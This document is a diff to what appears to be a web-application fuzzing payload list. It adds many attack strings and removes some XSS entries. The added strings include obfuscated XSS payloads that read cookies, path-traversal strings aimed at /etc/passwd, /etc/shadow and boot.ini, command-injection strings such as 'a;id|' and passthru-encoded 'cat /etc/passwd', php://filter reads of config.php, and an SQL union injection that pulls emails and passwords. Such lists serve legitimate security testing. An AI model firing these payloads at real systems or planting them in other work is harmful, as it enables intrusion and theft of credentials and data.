@@ -1,3 +1,86 @@
+https://redirect.runscope.net
+'"></alert>(1)'
+data:text/html;charset=utf-7;base64,HNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
+data:text/html,<script>alert(0)</script>
+data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
+<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
+vbscript:msgbox("XSS")
+#"><img src=/ onerror=alert(2)>
+-(confirm)(document.domain)//
+; alert(1);//
+/<svg onload=alert(1)>
+/<script>alert('XSS');//
+/<input autofocus onfocus=alert(1)>
+javascript:prompt(1)
+%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341
+&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41
+\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
+\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
+\152\141\166\141\163\143\162\151\160\164\072alert(1)
+java%0ascript:alert(1)
+java%09script:alert(1)
+java%0dscript:alert(1)
+\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
+javascript://%0Aalert(1)
+javascript://anything%0D%0A%0D%0Awindow.alert(1)
+data:text/html,<script>alert(0)</script>
+data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
+<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
+vbscript:msgbox("XSS")
+<name><value><![CDATA[<script>confirm(document.domain)</script>]]></value></name>
+<script>alert(document.cookie+'a')</script>
+PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUrJ2EnKTwvc2NyaXB0Pg==
+'"><iframe/onload=alert(1)>'
+"'"
+'
+"\\"
+\\
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini
+/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini%00
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00test.htm
+/../../../../../../../../../../../../../../../../../etc/passwd
+./../../../../../../../../../../../../../../../../etc/passwd%00
+/etc/passwd
+/etc/passwd%00
+C:\\boot.ini
+C:\\boot.ini%00
+hTtP://tests.arachni-scanner.com/rfi.md5.txt
+hTtP://tests.arachni-scanner.com/rfi.md5.txt%00
+1,2,3
+ABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJ
+{{1336%2B1}}
+1336+1
+$(cat+/etc/passwd)
+$(sleep+10)
+phpinfo()
+{${passthru(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100))}}{${exit()}}
+{${passthru(chr(115).chr(108).chr(101).chr(101).chr(112).chr(32).chr(49).chr(48))}}{${exit()}}
+/etc/passwd
+php://filter/convert.base64-encode/resource=config.php
+/proc/self/environ
+../../../../etc/passwd%00jpg
+../../../../etc/passwd%00
+../../../../etc/passwd
+=null+union+all+select+1,2,3,concat(0x3a,email,password),5,6,7,8,9,10+from+users--
+system(whoami);
+a;id|
+a)|id
+a|id
+a)|id;
+a|id
+|/bin/ls -al
+a);/usr/bin/id
+a;/usr/bin/id
+a);/usr/bin/id;
+a;/usr/bin/id;
+
+\u003E\u003Cxss\u003Etest
+xss=\"co\u006efirm(domain)
+onc\u006Cick=\"co\u006efirm(domain)
+<marquee+onstart='alert(document.cookie)'>XSS
+<marquee+onstart='alert(document.cookie)'>XSS
+xss\”onclick=\”alert(1)
 500); alert(document.cookie);//
 (alert)(1)
 a=alert,a(1)
@@ -8,20 +91,12 @@ al\u0065rt(1)
 top[‘al\145rt’](1)
 top[‘al\x65rt’](1)
 top[8680439..toString(30)](1)
-<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
-<Video> <source onerror = "javascript: alert (XSS)">
-<Input value = "XSS" type = text>
-<applet code="javascript:confirm(document.cookie);">
-<isindex x="javascript:" onmouseover="alert(XSS)">
-"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
-"><img src="x:x" onerror="alert(XSS)">
-"><iframe src="javascript:alert(XSS)">
-<object data="javascript:alert(XSS)">
-<isindex type=image src=1 onerror=alert(XSS)>
-<img src=x:alert(alt) onerror=eval(src) alt=0>
-<img src="x:gif" onerror="window['al\u0065rt'](0)"></img>
-<iframe/src="data:text/html,<svg onload=alert(1)>">
-<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
+/etc/issue
+/etc/passwd
+/etc/shadow
+/etc/group
+/etc/hosts
+/etc/motd
 <svg><script xlink:href=data&colon;,window.open('​https://www.google.com/'​)></script
 <meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
 <iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
